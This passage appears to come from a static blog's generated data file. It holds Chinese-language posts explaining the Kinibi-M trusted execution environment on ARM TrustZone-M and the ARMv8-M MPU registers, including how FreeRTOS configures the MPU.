的中断请求后请求安全模块的命令处理的过程中会引入额外的开销。在处理中断之前设置安全保护措施的时间大概需要400个时钟周期。</p>\n<h2 id=\"Invoke-Command-Benchmark\"><a href=\"#Invoke-Command-Benchmark\" class=\"headerlink\" title=\"Invoke Command Benchmark\"></a>Invoke Command Benchmark</h2><p>在一个 Non-secure 的应用调用一个安全模块的过程中或者安全模块调用安全模块的过程中，由于命令的调用需要进行上下文的切换，所以会产生一定的开销。</p>\n<h3 id=\"Non-secure-Application-Calling-Invoke-command\"><a href=\"#Non-secure-Application-Calling-Invoke-command\" class=\"headerlink\" title=\"Non-secure Application Calling Invoke command\"></a>Non-secure Application Calling Invoke command</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/non_call_secure.jpg\" alt><br></p>\n<h3 id=\"Secure-Module-Calling-Invoke-command\"><a href=\"#Secure-Module-Calling-Invoke-command\" class=\"headerlink\" title=\"Secure Module Calling Invoke command\"></a>Secure Module Calling Invoke command</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_secure.jpg\" alt><br></p>\n<h2 id=\"Invoke-Command-Handle-Process\"><a href=\"#Invoke-Command-Handle-Process\" class=\"headerlink\" title=\"Invoke Command Handle Process\"></a>Invoke Command Handle Process</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/invoke_command_process.jpg\" alt><br></p>\n<h2 id=\"Basic-Non-secure-Application-Implementation\"><a href=\"#Basic-Non-secure-Application-Implementation\" class=\"headerlink\" title=\"Basic Non-secure Application Implementation\"></a>Basic Non-secure Application Implementation</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/basic_non_secure_application.jpg\" alt><br></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>Kinibi-M 是一个可移植的可信执行环境（Trusted Execution Environment），用于在设备上执行可信的应用程序。它包括内建的<strong>密码算法</strong>和<strong>安全数据存储</strong>。它可以被集成到支持ARM TrustZone-M的不同微处理器上。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/overview.png\" alt><br></p>\n<p>Kinibi-M 利用TrustZone-M 以及 secure gateway 来与传统的 non-secure 应用进行隔离<br></p>\n<p>Secure-World 包括 Kinibi-M Bootloader 以及带有多个安全模块的 Kinibi-M 操作系统，可以为 Non-Secure World 中的应用程序提供安全的功能。Non-Secure World 包括主要的应用程序以及调用安全模块的接口。</p>\n<p>Kinibi-M 含有一个设备唯一的密钥，它是设备出厂时由制造商安装的。它可以为Kinibi-M系统提供消息证明的功能。证明的消息可以被 Trustonic 的云服务商认证， 说明该消息来自一个已知的设备。</p>\n<p>Kinibi-M API 主要利用 ARM TrustZone-M 中的 NSC(non-secure callable memory) 实现。Kinibi-M 在NSC中使用了一个 <strong>single entry</strong> 来保证 Secure 和 Non-secure 之间的隔离。API 相当于一个 Secure World 与 Non-secure World 之间的交互通道，为 non-secure 中的应用程序提供了接口，应用程序给 API 发送命令， API负责将命令交给 Secure World 中的安全模块。</p>\n<p>在 Secure World 中，Kinibi-M 提供了安全模块 API 接口，用于开发安全模块。 一个安全模块一般在安全 flash 中运行， 并且只能访问它所在头文件中定义的安全的资源。 安全模块的初始化过程是在 Kinibi-M 系统的 boot 阶段，一旦启动后就可以处理 Non-secure World 应用程序的命令请求。</p>\n<h2 id=\"Global-Architecture-Overview\"><a href=\"#Global-Architecture-Overview\" class=\"headerlink\" title=\"Global Architecture Overview\"></a>Global Architecture Overview</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/global_overview.jpg\" alt><br></p>\n<p>当一个 Non-secure World 应用程序传入命令参数并调用 Kinibi-M 的安全模块时，首先进入位于NSC内存中的 Secure Gateway ，然后进入 Secure World 中的 Kinibi-M 内核，内核根据命令参数选择安全模块。由于每个安全模块都是运行在低权限模式下，内核将权限从高权限降到低权限，并将命令参数传给响应的模块进行处理。处理结束后，安全模块通过系统调用回到 Kinibi-M 内核并由内核切换到 Non-secure World 的应用程序。</p>\n<p>当有一个安全模块发送命令给另外一个安全模块时，先是通过系统调用交给 Kinibi-M 内核。内核识别发送命令的安全模块并将命令参数交给需要接受的安全模块。</p>\n<p>Kinibi-M 通过配置内存保护单元(MPU)对不同的安全模块进行隔离。每个安全模块可以访问它自己的代码和它的栈，但是不能读取其他安全模块的代码与栈。如果安全模块之间需要访问外设，该模块必须向内核声明该外设的地址来获得指定外设的访问权限。</p>\n<h2 id=\"Secure-Module-Manifest-Overview\"><a href=\"#Secure-Module-Manifest-Overview\" class=\"headerlink\" title=\"Secure Module Manifest Overview\"></a>Secure Module Manifest Overview</h2><p>Kinibi-M 安全模块需要包括一个C的头文件，该头文件定义安全模块的ID以及一个清单。清单包含所属安全模块需要访问的资源。资源可以是：</p>\n<ul>\n<li>一段内存区域</li>\n<li>中断号</li>\n</ul>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/manifest.jpg\" alt><br></p>\n<p>当 Kinibi-M 将所有的安全模块启动之后，不同的模块不能访问同一个资源除非该资源被标记为 shared。Kinibi-M 保留一些系统内存资源以防安全模块对其访问来保证其安全性，比如 secure bootloader 内存区域。</p>\n<p>下图展示了一个安全模块的头文件样例，在该文件中，安全模块声明了一个安全的PORT外设(地址区间为0x40003200-0x40003400)。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_manifest.jpg\" alt><br></p>\n<h2 id=\"Secure-Module-Command-Overview\"><a href=\"#Secure-Module-Command-Overview\" class=\"headerlink\" title=\"Secure Module Command Overview\"></a>Secure Module Command Overview</h2><p>安全模块的 Command Interface 由一个 invoke_entry 的回调函数构成。命令参数包括Command ID 以及操作结构体。Command ID 是安全模块定义的一个32 bit 的值。操作结构体包含至多四个参数，如下图所示：</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_module_command_overview.jpg\" alt><br></p>\n<p>每个参数可以是value类型或者buffer类型，也可以不使用：</p>\n<ul>\n<li>value：包含两个32 bit 的值</li>\n<li>buffer：包含一个指针和一个大小</li>\n</ul>\n<p>每个安全模块可以任意选择它所需要的参数的类型。参数可以是输入类型，输出类型或者输入输出类型。对于一个输入的buffer类型参数，安全模块只能读取，但是无法修改它。而输出类型的buffer类型参数可以被安全模块修改，包括内容和大小。输入输出类型的参数可以被安全模块读写。</p>\n<p>安全模块可以接受命令输入参数并返回命令输出参数。它必须返回 32 bit 的值来表示命令调用结果(调用成功，未实现，调用失败)</p>\n<p>在转发命令参数的过程中，Kinibi-M内核先检查操作结构体中的参数，以确保其安全性。比如，Kinibi-M 检查发送方的命令参数是否访问的是该模块所允许访问的资源，如果这个命令是从 Non-secure World 发起，Kinibi-M 需要保证其参数中没有对 Secure World 内存的引用。</p>\n<p>Kinibi-M 通过配置 MPU 来为被调用的安全模块开启对 buffer 参数的访问权限。因为 MPU 已经被用来隔离代码和栈，所以当MPU的区域数达到上限时，Kinibi-M 必须将参数拷贝到栈中。以下框图显示了一个安全模块用MPU来处理命令参数。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/command_handle_memory layout.jpg\" alt><br></p>\n<p>在上图中，左边展示的是最好的情况，即所有的命令参数都能被 MPU 所保护起来。在右边第二种情况下，Kinibi-M 已经用了 MPU 中的四个区域，所以需要拷贝第二个 buffer 参数到安全模块的栈中。</p>\n<p>另外，除了安全模块的代码和栈所用到的 MPU 的区域块，其他的区域块可能会被 Kinibi-M 模块用来允许安全模块访问其头文件中定义的内存资源。</p>\n<p>当 Kinibi-M 必须要拷贝操作结构体到安全模块的栈中时，依旧能保证安全和隔离性，但是会影响性能。拷贝的时间取决于 buffer 参数的大小。SAML11 有四个 MPU 区域块，两个被安全模块的代码和栈所使用，剩下两个用来传递参数。需要注意的是，一旦安全模块声明需要访问内存资源，一个区域块就会被用来作为指定内存资源的访问控制，所以只留下一个区域块用来传递参数的引用。当区域块不够时，后面的参数会被拷贝。</p>\n<h2 id=\"Interrupt-Handling-Overview\"><a href=\"#Interrupt-Handling-Overview\" class=\"headerlink\" title=\"Interrupt Handling Overview\"></a>Interrupt Handling Overview</h2><p>当一个 Kinibi-M 的安全模块想要处理中断时，它必须在自己的资源清单中声明所要处理的中断号。一旦被声明， Kinibi-M 会将该中断分配给 Secure World，该中断就不能被 non-secure world 所访问。<br>当安全模块在清单里声明中断号之后，一旦一个中断发生，Kinibi-M 会请求安全模块的命令处理模块。命令处理模块能够通过命令参数分辨出该请求是中断处理请求还是普通调用请求。在中断请求的命令参数中，操作值不再是四个参数的指针，而是等于中断号。因此，安全模块可以根据中断号来处理不同的中断。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_interrupt_handler.jpg\" alt><br></p>\n<p>当安全模块处理中断请求时，它的权限和处理普通调用请求一样。</p>\n<p>因为要配置 MPU 来保证安全模块的隔离性，Kinibi-M 内核在收到 MCU 的中断请求后请求安全模块的命令处理的过程中会引入额外的开销。在处理中断之前设置安全保护措施的时间大概需要400个时钟周期。</p>\n<h2 id=\"Invoke-Command-Benchmark\"><a href=\"#Invoke-Command-Benchmark\" class=\"headerlink\" title=\"Invoke Command Benchmark\"></a>Invoke Command Benchmark</h2><p>在一个 Non-secure 的应用调用一个安全模块的过程中或者安全模块调用安全模块的过程中，由于命令的调用需要进行上下文的切换，所以会产生一定的开销。</p>\n<h3 id=\"Non-secure-Application-Calling-Invoke-command\"><a href=\"#Non-secure-Application-Calling-Invoke-command\" class=\"headerlink\" title=\"Non-secure Application Calling Invoke command\"></a>Non-secure Application Calling Invoke command</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/non_call_secure.jpg\" alt><br></p>\n<h3 id=\"Secure-Module-Calling-Invoke-command\"><a href=\"#Secure-Module-Calling-Invoke-command\" class=\"headerlink\" title=\"Secure Module Calling Invoke command\"></a>Secure Module Calling Invoke command</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/secure_secure.jpg\" alt><br></p>\n<h2 id=\"Invoke-Command-Handle-Process\"><a href=\"#Invoke-Command-Handle-Process\" class=\"headerlink\" title=\"Invoke Command Handle Process\"></a>Invoke Command Handle Process</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/invoke_command_process.jpg\" alt><br></p>\n<h2 id=\"Basic-Non-secure-Application-Implementation\"><a href=\"#Basic-Non-secure-Application-Implementation\" class=\"headerlink\" title=\"Basic Non-secure Application Implementation\"></a>Basic Non-secure Application Implementation</h2><p><img style=\"display: block; margin: 0 auto;\" src=\"images/basic_non_secure_application.jpg\" alt><br></p>\n"},{"title":"ARMv8-M MPU Introduction","catalog":true,"date":"2020-09-20T07:00:00.000Z","subtitle":null,"header-img":null,"top":false,"_content":"# Overview\n\n内存保护单元(Memory Protection Unit,以下简称 MPU)是 ARM 为低端芯片提供的可编程内存保护单元，可以让运行在 privileged 模式下的代码定义不同的内存区域的访问权限。根据处理器的实现，MPU 至多可以实现16个区域的划分，每个区域有独立的访问权限。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/cortexm23_architecture.jpg\" alt=\"\" /><br>\n\n上图为 ARM Cortex-M23 处理器的整体架构图，从图上可以看到，每次内存访问都会经过 MPU。\n一些特殊的内存访问不受 MPU 的配置影响，比如异常向量表，系统控制空间( System Control Space，其中包括 MPU， NVIC, SysTick 以及 Private Peripheral Bus(PPB, 其中包括debug组件)。而且，对 MPU 的配置不能够定义对 debug 访问权限。\n\nARMv8-M MPU 支持每个安全状态(non-secure 和 secure)0-8个区域的配置。MPU 的主要特性如下:\n* 区域最小大小为32字节，最大为4GB，但必须为32字节的整数倍\n* 所有的区域必须以32字节对齐\n* 每个区域对两个处理器模式(privileged 和 unprivileged)拥有独立的读/写权限\n* eXecure Never(XN)属性可以用来分割代码段和数据段\n\n# Memory type definitions\n在 ARMv8-M 架构下，内存空间类型被划分为 Normal Memory 和 Device Memory。如果 ARMv8-M 架构实现了安全扩展，那么内存空间又可以分为 Secure 和 Non-secure 内存区域。\n对于 Normal Memory 来说，有以下几个属性设置：\n\n* Cacheability: Cache policy; Allocation; Transient hint\n* Shareability: Non-shareable memory, Inner shareable memory, Outer shareable memory\n* eXecute Never\n  \n# Memory Configuration\nMPU 可以通过一串连续的寄存器配置，这些寄存器由内存映射到了SCB地址空间，并且这些寄存器在 Secure 和 Non-secure 两个状态下是banked的(banked是指处理器在访问某一地址的寄存器时，实际对应的寄存器实体取决于不同的状态)。在 Secure 和 Non-secure 状态下配置MPU的过程是一样的。在 ARMv8-M 架构下，MPU的寄存器范围为 0xE000ED90 至 0xE000EDC4，此外，Secure 状态下可以通过额外的地址访问 Non-secure 的寄存器。MPU 寄存器只可以在 privileged 模式下访问。MPU 默认关闭在重启之后。下表为 MPU 所有寄存器的地址信息。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_registers.jpg\" alt=\"\" /><br>\n\n# Memory Register Definitions\n\n## MPU_TYPE\nMPU 类型寄存器是只读寄存器，它表明 MPU 可用的区域总数\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_type_register.jpg\" alt=\"\" /><br>\n\n## MPU_CTRL\n由下图可见MPU_CTRL 寄存器有三个功能，第一个是定义使能 privileged background 区域，即没有在mpu区域内的内存空间。第二个是使能 HardFault 和 NMI 受到 MPU 配置影响。第三个是使能 MPU 配置生效。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register1.jpg\" alt=\"\" /><br>\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register2.jpg\" alt=\"\" /><br>\n\n## MPU_RNR\nMPU_RNR 寄存器负责选择 MPU 的区域号\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rnr_register.jpg\" alt=\"\" /><br>\n\n## MPU_RBAR \nMPU_RBAR 寄存器主要负责定义一个区域的起始地址和访问权限\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register1.jpg\" alt=\"\" /><br>\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register2.jpg\" alt=\"\" /><br>\n\n## MPU_RLAR\nMPU_RLAR 负责定义区域的大小，选择区域属性配置项以及区域的使能。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlar_register.jpg\" alt=\"\" /><br>\n\n## MPU_MAIR0/1\nMPU_MAIR0/1 用于设定内存的类型(device memory or normal memory)\n\n## Other registers\n除了以上寄存器，MPU 还提供了其他一些寄存器，比如 MPU_RBAR_A1/2/3，MPU_RLAR_A1/2/3。这些寄存器主要是为了加速开发流程，不需要每次配置一个区域需要设置区域号，可以一次配置多个区域。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlara_register.jpg\" alt=\"\" /><br>\n\n# Configure an MPU region\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/configure_mpu.jpg\" alt=\"\" /><br>\n\n# MPU Configuration in FreeRTOS\nFreeRTOS 源码中对 background 设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/backgroud_freertos.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对 MPU_MAIR0/1 的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mair_freertos.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对用户 stack 的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_stack.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对指定 MPU 区域的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_region_configuration.jpg\" alt=\"\" /><br>","source":"_posts/arm_mpu.md","raw":"---\ntitle: ARMv8-M MPU Introduction\ncatalog: true\ndate: 2020.9.20\nsubtitle: \nheader-img: \ntop: false\ntags: peripherals\ncategories: MCU \n---\n# Overview\n\n内存保护单元(Memory Protection Unit,以下简称 MPU)是 ARM 为低端芯片提供的可编程内存保护单元，可以让运行在 privileged 模式下的代码定义不同的内存区域的访问权限。根据处理器的实现，MPU 至多可以实现16个区域的划分，每个区域有独立的访问权限。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/cortexm23_architecture.jpg\" alt=\"\" /><br>\n\n上图为 ARM Cortex-M23 处理器的整体架构图，从图上可以看到，每次内存访问都会经过 MPU。\n一些特殊的内存访问不受 MPU 的配置影响，比如异常向量表，系统控制空间( System Control Space，其中包括 MPU， NVIC, SysTick 以及 Private Peripheral Bus(PPB, 其中包括debug组件)。而且，对 MPU 的配置不能够定义对 debug 访问权限。\n\nARMv8-M MPU 支持每个安全状态(non-secure 和 secure)0-8个区域的配置。MPU 的主要特性如下:\n* 区域最小大小为32字节，最大为4GB，但必须为32字节的整数倍\n* 所有的区域必须以32字节对齐\n* 每个区域对两个处理器模式(privileged 和 unprivileged)拥有独立的读/写权限\n* eXecure Never(XN)属性可以用来分割代码段和数据段\n\n# Memory type definitions\n在 ARMv8-M 架构下，内存空间类型被划分为 Normal Memory 和 Device Memory。如果 ARMv8-M 架构实现了安全扩展，那么内存空间又可以分为 Secure 和 Non-secure 内存区域。\n对于 Normal Memory 来说，有以下几个属性设置：\n\n* Cacheability: Cache policy; Allocation; Transient hint\n* Shareability: Non-shareable memory, Inner shareable memory, Outer shareable memory\n* eXecute Never\n  \n# Memory Configuration\nMPU 可以通过一串连续的寄存器配置，这些寄存器由内存映射到了SCB地址空间，并且这些寄存器在 Secure 和 Non-secure 两个状态下是banked的(banked是指处理器在访问某一地址的寄存器时，实际对应的寄存器实体取决于不同的状态)。在 Secure 和 Non-secure 状态下配置MPU的过程是一样的。在 ARMv8-M 架构下，MPU的寄存器范围为 0xE000ED90 至 0xE000EDC4，此外，Secure 状态下可以通过额外的地址访问 Non-secure 的寄存器。MPU 寄存器只可以在 privileged 模式下访问。MPU 默认关闭在重启之后。下表为 MPU 所有寄存器的地址信息。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_registers.jpg\" alt=\"\" /><br>\n\n# Memory Register Definitions\n\n## MPU_TYPE\nMPU 类型寄存器是只读寄存器，它表明 MPU 可用的区域总数\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_type_register.jpg\" alt=\"\" /><br>\n\n## MPU_CTRL\n由下图可见MPU_CTRL 寄存器有三个功能，第一个是定义使能 privileged background 区域，即没有在mpu区域内的内存空间。第二个是使能 HardFault 和 NMI 受到 MPU 配置影响。第三个是使能 MPU 配置生效。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register1.jpg\" alt=\"\" /><br>\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register2.jpg\" alt=\"\" /><br>\n\n## MPU_RNR\nMPU_RNR 寄存器负责选择 MPU 的区域号\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rnr_register.jpg\" alt=\"\" /><br>\n\n## MPU_RBAR \nMPU_RBAR 寄存器主要负责定义一个区域的起始地址和访问权限\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register1.jpg\" alt=\"\" /><br>\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register2.jpg\" alt=\"\" /><br>\n\n## MPU_RLAR\nMPU_RLAR 负责定义区域的大小，选择区域属性配置项以及区域的使能。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlar_register.jpg\" alt=\"\" /><br>\n\n## MPU_MAIR0/1\nMPU_MAIR0/1 用于设定内存的类型(device memory or normal memory)\n\n## Other registers\n除了以上寄存器，MPU 还提供了其他一些寄存器，比如 MPU_RBAR_A1/2/3，MPU_RLAR_A1/2/3。这些寄存器主要是为了加速开发流程，不需要每次配置一个区域需要设置区域号，可以一次配置多个区域。\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlara_register.jpg\" alt=\"\" /><br>\n\n# Configure an MPU region\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/configure_mpu.jpg\" alt=\"\" /><br>\n\n# MPU Configuration in FreeRTOS\nFreeRTOS 源码中对 background 设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/backgroud_freertos.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对 MPU_MAIR0/1 的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/mair_freertos.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对用户 stack 的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_stack.jpg\" alt=\"\" /><br>\n\nFreeRTOS 源码中对指定 MPU 区域的设置\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_region_configuration.jpg\" alt=\"\" /><br>","slug":"arm_mpu","published":1,"updated":"2020-10-04T05:12:02.154Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfungjek0000uwjxwbr3310n","content":"<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>内存保护单元(Memory Protection Unit,以下简称 MPU)是 ARM 为低端芯片提供的可编程内存保护单元，可以让运行在 privileged 模式下的代码定义不同的内存区域的访问权限。根据处理器的实现，MPU 至多可以实现16个区域的划分，每个区域有独立的访问权限。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/cortexm23_architecture.jpg\" alt><br></p>\n<p>上图为 ARM Cortex-M23 处理器的整体架构图，从图上可以看到，每次内存访问都会经过 MPU。<br>一些特殊的内存访问不受 MPU 的配置影响，比如异常向量表，系统控制空间( System Control Space，其中包括 MPU， NVIC, SysTick 以及 Private Peripheral Bus(PPB, 其中包括debug组件)。而且，对 MPU 的配置不能够定义对 debug 访问权限。</p>\n<p>ARMv8-M MPU 支持每个安全状态(non-secure 和 secure)0-8个区域的配置。MPU 的主要特性如下:</p>\n<ul>\n<li>区域最小大小为32字节，最大为4GB，但必须为32字节的整数倍</li>\n<li>所有的区域必须以32字节对齐</li>\n<li>每个区域对两个处理器模式(privileged 和 unprivileged)拥有独立的读/写权限</li>\n<li>eXecure Never(XN)属性可以用来分割代码段和数据段</li>\n</ul>\n<h1 id=\"Memory-type-definitions\"><a href=\"#Memory-type-definitions\" class=\"headerlink\" title=\"Memory type definitions\"></a>Memory type definitions</h1><p>在 ARMv8-M 架构下，内存空间类型被划分为 Normal Memory 和 Device Memory。如果 ARMv8-M 架构实现了安全扩展，那么内存空间又可以分为 Secure 和 Non-secure 内存区域。<br>对于 Normal Memory 来说，有以下几个属性设置：</p>\n<ul>\n<li>Cacheability: Cache policy; Allocation; Transient hint</li>\n<li>Shareability: Non-shareable memory, Inner shareable memory, Outer shareable memory</li>\n<li>eXecute Never</li>\n</ul>\n<h1 id=\"Memory-Configuration\"><a href=\"#Memory-Configuration\" class=\"headerlink\" title=\"Memory Configuration\"></a>Memory Configuration</h1><p>MPU 可以通过一串连续的寄存器配置，这些寄存器由内存映射到了SCB地址空间，并且这些寄存器在 Secure 和 Non-secure 两个状态下是banked的(banked是指处理器在访问某一地址的寄存器时，实际对应的寄存器实体取决于不同的状态)。在 Secure 和 Non-secure 状态下配置MPU的过程是一样的。在 ARMv8-M 架构下，MPU的寄存器范围为 0xE000ED90 至 0xE000EDC4，此外，Secure 状态下可以通过额外的地址访问 Non-secure 的寄存器。MPU 寄存器只可以在 privileged 模式下访问。MPU 默认关闭在重启之后。下表为 MPU 所有寄存器的地址信息。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_registers.jpg\" alt><br></p>\n<h1 id=\"Memory-Register-Definitions\"><a href=\"#Memory-Register-Definitions\" class=\"headerlink\" title=\"Memory Register Definitions\"></a>Memory Register Definitions</h1><h2 id=\"MPU-TYPE\"><a href=\"#MPU-TYPE\" class=\"headerlink\" title=\"MPU_TYPE\"></a>MPU_TYPE</h2><p>MPU 类型寄存器是只读寄存器，它表明 MPU 可用的区域总数</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_type_register.jpg\" alt><br></p>\n<h2 id=\"MPU-CTRL\"><a href=\"#MPU-CTRL\" class=\"headerlink\" title=\"MPU_CTRL\"></a>MPU_CTRL</h2><p>由下图可见MPU_CTRL 寄存器有三个功能，第一个是定义使能 privileged background 区域，即没有在mpu区域内的内存空间。第二个是使能 HardFault 和 NMI 受到 MPU 配置影响。第三个是使能 MPU 配置生效。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register1.jpg\" alt><br><br><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register2.jpg\" alt><br></p>\n<h2 id=\"MPU-RNR\"><a href=\"#MPU-RNR\" class=\"headerlink\" title=\"MPU_RNR\"></a>MPU_RNR</h2><p>MPU_RNR 寄存器负责选择 MPU 的区域号</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rnr_register.jpg\" alt><br></p>\n<h2 id=\"MPU-RBAR\"><a href=\"#MPU-RBAR\" class=\"headerlink\" title=\"MPU_RBAR\"></a>MPU_RBAR</h2><p>MPU_RBAR 寄存器主要负责定义一个区域的起始地址和访问权限</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register1.jpg\" alt><br><br><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register2.jpg\" alt><br></p>\n<h2 id=\"MPU-RLAR\"><a href=\"#MPU-RLAR\" class=\"headerlink\" title=\"MPU_RLAR\"></a>MPU_RLAR</h2><p>MPU_RLAR 负责定义区域的大小，选择区域属性配置项以及区域的使能。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlar_register.jpg\" alt><br></p>\n<h2 id=\"MPU-MAIR0-1\"><a href=\"#MPU-MAIR0-1\" class=\"headerlink\" title=\"MPU_MAIR0/1\"></a>MPU_MAIR0/1</h2><p>MPU_MAIR0/1 用于设定内存的类型(device memory or normal memory)</p>\n<h2 id=\"Other-registers\"><a href=\"#Other-registers\" class=\"headerlink\" title=\"Other registers\"></a>Other registers</h2><p>除了以上寄存器，MPU 还提供了其他一些寄存器，比如 MPU_RBAR_A1/2/3，MPU_RLAR_A1/2/3。这些寄存器主要是为了加速开发流程，不需要每次配置一个区域需要设置区域号，可以一次配置多个区域。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlara_register.jpg\" alt><br></p>\n<h1 id=\"Configure-an-MPU-region\"><a href=\"#Configure-an-MPU-region\" class=\"headerlink\" title=\"Configure an MPU region\"></a>Configure an MPU region</h1><p><img style=\"display: block; margin: 0 auto;\" src=\"images/configure_mpu.jpg\" alt><br></p>\n<h1 id=\"MPU-Configuration-in-FreeRTOS\"><a href=\"#MPU-Configuration-in-FreeRTOS\" class=\"headerlink\" title=\"MPU Configuration in FreeRTOS\"></a>MPU Configuration in FreeRTOS</h1><p>FreeRTOS 源码中对 background 设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/backgroud_freertos.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对 MPU_MAIR0/1 的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mair_freertos.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对用户 stack 的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_stack.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对指定 MPU 区域的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_region_configuration.jpg\" alt><br></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>内存保护单元(Memory Protection Unit,以下简称 MPU)是 ARM 为低端芯片提供的可编程内存保护单元，可以让运行在 privileged 模式下的代码定义不同的内存区域的访问权限。根据处理器的实现，MPU 至多可以实现16个区域的划分，每个区域有独立的访问权限。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/cortexm23_architecture.jpg\" alt><br></p>\n<p>上图为 ARM Cortex-M23 处理器的整体架构图，从图上可以看到，每次内存访问都会经过 MPU。<br>一些特殊的内存访问不受 MPU 的配置影响，比如异常向量表，系统控制空间( System Control Space，其中包括 MPU， NVIC, SysTick 以及 Private Peripheral Bus(PPB, 其中包括debug组件)。而且，对 MPU 的配置不能够定义对 debug 访问权限。</p>\n<p>ARMv8-M MPU 支持每个安全状态(non-secure 和 secure)0-8个区域的配置。MPU 的主要特性如下:</p>\n<ul>\n<li>区域最小大小为32字节，最大为4GB，但必须为32字节的整数倍</li>\n<li>所有的区域必须以32字节对齐</li>\n<li>每个区域对两个处理器模式(privileged 和 unprivileged)拥有独立的读/写权限</li>\n<li>eXecure Never(XN)属性可以用来分割代码段和数据段</li>\n</ul>\n<h1 id=\"Memory-type-definitions\"><a href=\"#Memory-type-definitions\" class=\"headerlink\" title=\"Memory type definitions\"></a>Memory type definitions</h1><p>在 ARMv8-M 架构下，内存空间类型被划分为 Normal Memory 和 Device Memory。如果 ARMv8-M 架构实现了安全扩展，那么内存空间又可以分为 Secure 和 Non-secure 内存区域。<br>对于 Normal Memory 来说，有以下几个属性设置：</p>\n<ul>\n<li>Cacheability: Cache policy; Allocation; Transient hint</li>\n<li>Shareability: Non-shareable memory, Inner shareable memory, Outer shareable memory</li>\n<li>eXecute Never</li>\n</ul>\n<h1 id=\"Memory-Configuration\"><a href=\"#Memory-Configuration\" class=\"headerlink\" title=\"Memory Configuration\"></a>Memory Configuration</h1><p>MPU 可以通过一串连续的寄存器配置，这些寄存器由内存映射到了SCB地址空间，并且这些寄存器在 Secure 和 Non-secure 两个状态下是banked的(banked是指处理器在访问某一地址的寄存器时，实际对应的寄存器实体取决于不同的状态)。在 Secure 和 Non-secure 状态下配置MPU的过程是一样的。在 ARMv8-M 架构下，MPU的寄存器范围为 0xE000ED90 至 0xE000EDC4，此外，Secure 